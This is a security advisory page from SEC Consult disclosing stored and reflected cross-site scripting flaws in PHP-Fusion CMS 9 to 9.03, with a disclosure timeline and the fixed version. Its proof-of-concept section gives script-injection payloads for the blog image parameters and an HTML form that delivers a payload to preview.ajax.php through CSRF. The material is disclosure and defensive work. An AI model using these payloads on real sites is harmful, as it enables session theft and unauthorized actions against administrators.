=== Content from sec-consult.com_ad9d07dc_20250119_114855.html ===

Toggle Navbar

* [Career](/career/)
* [About us](/about-us/)
* [Contact](/contact/)

* EN
  + [DE](/de/vulnerability-lab/advisory/mehrere-cross-site-scripting-xss-schwachstellen-in-php-fusion-cms/ "German")
Search

* Compliance & Regulations
  + [NIS2](/compliance-regulations/nis2/)
  + [Digital Operational Resilience Act (DORA)](/compliance-regulations/dora/)
* Security Testing
  + [Web Application Security](/security-testing/web-application-security/)
  + [Penetration Testing](/security-testing/penetration-testing/)
  + [Mobile Security](/security-testing/mobile-security/)
  + [Cloud Security](/security-testing/cloud-security/)
  + [IT Infrastructure Security](/security-testing/it-infrastructure-security/)
  + [Security for SAP Services](/security-testing/security-for-sap-services/)
  + [IoT and Embedded Systems Security](/security-testing/iot-and-embedded-systems-security/)
  + [Red Teaming](/security-testing/red-teaming/)
* Processes & Organisation
  + [Information Security Management (ISM)](/processes-organisation/information-security-management-ism/)
  + [OT Security](/processes-organisation/ot-security/)
  + [Secure Software Development Consulting](/processes-organisation/secure-software-development/)
  + [Red Teaming](/security-testing/red-teaming/)
  + [SEC Trainings](/processes-organisation/sec-trainings/)
  + [Project- und Program Management](/processes-organisation/project-und-program-management/)
* Incident Response
  + [SEC Defence](/incident-response/sec-defence/)
* [Vulnerability Lab](/vulnerability-lab/)
* [Blog](/blog/)
 [Incident?
Breached?
Report an incident](/incident-response/sec-defence/)

1. [Home](/)
2. [Vulnerability Lab](/vulnerability-lab/)
3. Multiple Cross-Site Scripting (XSS) Vulnerabilities In PHP-Fusion CMS
# Multiple Cross-Site Scripting (XSS) Vulnerabilities In PHP-Fusion CMS

Title

Multiple Cross-site Scripting (XSS) Vulnerabilities

Product

PHP-Fusion CMS

Vulnerable Version

9 - 9.03

Fixed Version

9.03.30

CVE Number

-

Impact

medium

Homepage

[https://www.php-fusion.co.uk](https://www.php-fusion.co.uk "https://www.php-fusion.co.uk")

Found

09.12.2019

By

M. Ali, N. Ramadhan, W. Ikram, R. Jaafar, S. Maskan SEC Consult Vulnerability Lab (Office Malaysia)

XSS vulnerabilities in the PHP-Fusion CMS allow an attacker to perform unauthorized actions on behalf of another user. In addition, access information and other sensitive information can be intercepted directly.

## Vendor Description

*“PHP-Fusion is a lightweight open source content management system (CMS) written in PHP.*”

Source: <https://github.com/php-fusion>

## Business Recommendation

Update to the latest version of PHP-Fusion. An in-depth security analysis performed by security professionals is highly advised, as the software may be affected from further security issues.

## Vulnerability Overview / Description

### 1) Stored XSS vulnerability

This vulnerability within PHP-Fusion allows an attacker (user with edit post capability) to inject malicious client side scripting code which will be executed in the browser of a user with “Error Log” access privilege (usually administrator or super administrator).

### 2) Reflected XSS vulnerability

This vulnerability within PHP-Fusion allows an attacker to inject malicious client side scripting code which will be executed in the browser of users.

## Proof Of Concept

### 1) Stored XSS vulnerability

#### A) Edit Blog Post Function

This vulnerability can be exploited by an attacker with “edit post” capability. By editing a blog post, malicious script code can be injected through the affected parameters (defined below). When saving the changes made, the application will store the XSS payload in the database as an error (table <dbtableprefix>\_errors). Then, the application will load all the errors to notify the administrator in the “Error Log” notification module. The XSS payload will get executed on any page since it was the application behavior loading all the errors on any page as long as the affected user’s session is active.

Below is the example on how the XSS issue can be exploited.

***URL : [$DOMAIN/<PHP-Fusion](http://$DOMAIN/%26lt;PHP-Fusion) Directory>/fusion/infusions/blog/blog\_admin.php?aid=<aid>&action=edit&section=blog\_form&blog\_id=<id#> METHOD : POST PAYLOAD: '><script>alert(document.cookie)</script> PARAMETER: blog\_image, blog\_image\_t1, blog\_image\_t2 Content-Type: multipart/form-data; boundary=---------------------------247592002319215 Content-Length: 3051 Origin: [$DOMAIN](http://$DOMAIN) Connection: close Referer: [$DOMAIN/fusion/infusions/blog/blog\_admin.php](http://$DOMAIN/fusion/infusions/blog/blog_admin.php?aid=&lt;aid&gt;&amp;action=edit&amp;section=blog_form&amp;blog_id=2) Cookie: [snip] [snip] -----------------------------247592002319215 Content-Disposition: form-data; name="blog\_image" pp.jpg'><script>alert(document.cookie)</script> [snip]***

### 2) Reflected XSS vulnerability

#### A) Preview Blog Post Function

This vulnerability can be exploited by an unauthenticated attacker. The XSS payload is injected in the preview.ajax.php script through the parameter “text”. Below is the example on how the XSS issue can be exploited through CSRF.

***URL : [$DOMAIN/<PHP-Fusion](http://$DOMAIN/%26lt;PHP-Fusion) Directory>/includes/dynamics/assets/preview/preview.ajax.php METHOD : POST PAYLOAD: <script>alert(document.cookie)</script> Create a HTML file with content as below and open it with browser. <html> <body> <form action="$DOMAIN/<PHP-Fusion Directory>/includes/dynamics/assets/preview/preview.ajax.php" method="POST"> <input type="hidden" name="text" value="xyz<script>alert(document.cookie)</script>zzz" /> <input type="hidden" name="editor" value="html" /> <input type="hidden" name="url" value="/infusion/xxyyzz.php" /> <input type="submit" value="Submit request" /> </form> </body> </html>***

## Vulnerable / Tested Versions

PHP-Fusion version 9.03.00 has been tested, which was the latest version available at the time of the test.

## Vendor Contact Timeline

| 2019-12-10 | Contacting vendor by email technical@php-fusion.co.uk, sales@php-fusion.co.uk, billing@php-fusion.co.uk, management@php-fusion.co.uk |
| --- | --- |
| 2019-12-11 | Vendor lead developer contact SEC Consult via Whatsapp and ask to send the detail unencrypted to his email chan@php-fusion.co.uk. Email sent to the lead developer on the same day. |
| 2020-01-23 | Vendor fixed the reported issues, but it can be bypassed. SEC Consult informed the Lead Developer via Whatsapp. The lead developer requests extension (3 weeks). Latest possible release date changed to 24th Feb 2020. |
| 2020-02-01 | Vendor fixed issue no. 2 (Reflected XSS). Issue no. 1 (Stored XSS) remains unfixed. |
| 2020-02-04 | Vendor informed fixed version available on github page. |
| 2020-02-11 | Vendor requested two weeks to inform their users to update their websites. Latest possible release date changed to 25th Feb 2020. |
| 2020-02-11 | Requesting CVE ID, only automatic reply with request ID. |
| 2020-02-21 | Asking for CVE ID again, no reply. |
| 2020-02-25 | Public release of security advisory. |

## Solution

The fixed version 9.03.30 is available at the vendor’s download section:
<https://www.php-fusion.co.uk/php_fusion_9_downloads.php>

## Workaround

No workaround available.

## Advisory URL

https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html

EOF M. Ali, W. Ikram, S. Maskan, N. Ramadhan, R. Jaafar / @2020

### Contact

Interested to work with the experts of SEC Consult? Send us your application.
[Contact](/contact/)[Back](/vulnerability-lab/)

* [Legal Notice](/legalnotice/)
* [Privacy Statement](/privacy-statement/)
* [Jobs](/career/)

SEC Consult is one of the leading consultancies in the field of cyber and [application security](/security-testing/web-application-security/ "Web Application Security"). The company specializes in [information security management](/processes-organisation/information-security-management-ism/ "Information Security Management (ISM)"), NIS security audits, [penetration testing](/security-testing/penetration-testing/ "Pentesting (Pentest)"), ISO 27001 certification support, [Cyber Defence](/incident-response/sec-defence/ "Cyber Defence") and [secure software certification](/processes-organisation/secure-software-development/ "Secure Software Development Consulting"). SEC Consult is part of [Eviden](https://eviden.com/ "Link to Eviden website").

[![bsi ISO/IEC 27001 Information Security Management CERTIFIED](/typo3temp/assets/_processed_/c/2/csm_bsi_9a24e74563.png)](/about-us/ "About us")[![ISO 27001 CREST certified](/typo3temp/assets/_processed_/0/6/csm_crest_0eb9c5864d.png)](/about-us/ "About us")[![Great Place To Work AT certified](/typo3temp/assets/_processed_/0/3/csm_great-place-to-work-at_773b265aa6.png)](/about-us/ "About us")[![Great Place To Work DE certified](/typo3temp/assets/_processed_/d/6/csm_great-place-to-work-de_2fcb537270.png)](/about-us/ "About us")

## We use Cookies

We use cookies to offer you a perfect visit experience. These include cookies that are necessary for the operation of the site and for the control of our commercial corporate goals, as well as those that are only used for anonymous statistical purposes, for convenience settings or to display personalized content. Decide for yourself which categories you want to allow. Please note that based on your settings, not all functions of the site may be available.

**[Legal Notice](/legalnotice/)** •  **[Privacy Statement](/privacy-statement/)**

### Technically required

(
0
Service
)

no

Technically required (
0
Service
)

yes

### Analysis / statistics

(
1
Service
)

Anonymous evaluation for troubleshooting and further development

no

Analysis / statistics (
1
Service
)

yes

#### Matomo

no

Matomo

yes

Matomo.org
Show details

Hide details

**Purpose**: Error analysis, statistical evaluation of our website accesses, campaign analysis, conversion tracking.
 **Processing operations**: collection of access data, data from your browser and data about the content accessed; execution of analysis software and storage of data on your terminal device, anonymization of the data collected; evaluation of the anonymous data in the form of statistics.
 **Storage period**: 1 year.
 **Joint controller**: LimeSoda Interactive Marketing GmbH.
 **Legal basis for data processing**: Art. 6 para. 1 lit. f of the DSGVO.
 **Consequences of non-consent**: This basic tracking is absolutely necessary for the operation of our website.
 **Data transfer**: The data collected with Matomo is stored on our own servers. It is not passed on to third parties.

Accept selected

Reject all

Accept all


